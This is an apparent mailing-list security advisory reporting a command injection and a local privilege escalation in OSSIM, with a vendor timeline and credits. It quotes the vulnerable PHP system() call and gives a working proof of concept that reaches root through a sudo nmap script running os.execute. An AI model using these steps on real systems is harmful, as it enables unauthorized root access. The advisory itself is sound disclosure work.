Regards,  Damien Cauquil    ================================================ Multiple vulnerabilities in OSSIM < ================================================   Description ===========  Multiple vulnerabilities were found in OSSIM <  * an authenticated arbitrary command execution vulnerability  * a local privilege escalation vulnerability   Authenticated arbitrary command execution =========================================  OSSIM launches a network discovery with the form located at http://IP/ossim/netscan/ but failed at sanitizing a supplied parameter (assets[]) when processing the request, resulting in an arbitrary command execution.  **CVSS v2 Base Score**: 6.5  **CVSS v2 Vector**: (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N)  **AlienVault ID**:  **CVE-ID**: <Requested>  ---------------- Proof of Concept ----------------    ```   GET HTTP/1.1   Host:   User-Agent: Mozilla/5.0 (X11; Linux   Accept: application/json, text/javascript, */*;   Accept-Language:   Accept-Encoding: gzip, deflate   DNT: 1   X-Requested-With: XMLHttpRequest   Referer:   Cookie:   Connection: keep-alive   ```  --------------- Vulnerable code ---------------  The vulnerable code is located in /usr/share/ossim/www/netscan/do_scan.php, line  ``` if ($data['status'] == 'success') {     //Delete previous scan     $scan = new Scan();     $scan->delete_data();      // Launch scan in background     $cmd = "/usr/bin/php /usr/share/ossim/scripts/vulnmeter/remote_nmap.php '$assets_p' '$scanning_sensor' '$timing_template' '$scan_mode' '" . Session::get_session_user() . "' '$autodetect$      system($cmd); } ```  -------- Solution --------  Upgrade to OSSIM    Local privilege escalation ==========================  OSSIM uses *sudo* to launch a nmap scan for network discovery, allowing privilege escalation through a specifically crafted nmap script.  **CVSS v2 Base Score**: 3.4  **CVSS v2 Vector**:  (AV:L/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:N)  **AlienVault ID**:  **CVE-ID**: <requested>  ---------------- Proof of Concept ----------------  ``` python -c "import pty; pty.spawn('/bin/bash')" www-data@...envault:/usr/share/ossim/www/netscan$ id uid=33(www-data) gid=33(www-data) www-data@...envault:/usr/share/ossim/www/netscan$ echo 'local os = require "os" os.execute("id")' > /tmp/exec www-data@...envault:/usr/share/ossim/www/netscan$ sudo nmap --script=/tmp/exec -p 80  Starting Nmap ( http://nmap.org ) at CEST NSE: Warning: Loading '/tmp/exec' -- the recommended file extension is '.nse'. uid=0(root) gid=0(root) groups=0(root) ```  --------------- Vulnerable code ---------------  /etc/sudoers ``` [...] www-data ALL=NOPASSWD: /usr/bin/nmap [...] ```  -------- Solution --------  Upgrade to OSSIM   Timeline ========  * Vendor notified * Vendor replied * Vendor confirmed the vulnerabilities * Vendor issued fix (included in version of OSSIM)   Credits =======  * Vincent Hautot, Sysdream (v.hautot -at- sysdream -dot- com) * Damien CAUQUIL, Sysdream (d.cauquil -at- sysdream -dot- com)   Contact =======  * Website: http://www.sysdream.com * Twitter: @sysdream  --   Damien Cauquil Directeur R&D / Head of Research Certified EC-Council Instructor / CEH / CHFI / ECSA  Sysdream 14, place Marie-Jeanne Bassot Levallois-Perret   Tel: +33 (0)1 78 76 58 21   Download attachment of type "application/pgp-keys" bytes)  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.
